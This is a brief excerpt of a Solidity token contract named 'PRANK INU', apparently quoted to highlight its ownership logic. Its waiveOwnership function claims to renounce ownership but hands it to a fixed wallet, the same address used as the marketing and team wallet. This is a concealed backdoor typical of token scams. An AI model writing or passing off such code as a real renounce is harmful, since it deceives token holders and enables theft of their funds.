...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x41BF70887F97dD5eBA04EC31aC8D40A7E11C968c);
    }
...
contract PRANKINU is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "PRANK INU";
    string private _symbol = "PRANK";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x41BF70887F97dD5eBA04EC31aC8D40A7E11C968c);
    address payable public teamWalletAddress = payable(0x41BF70887F97dD5eBA04EC31aC8D40A7E11C968c);
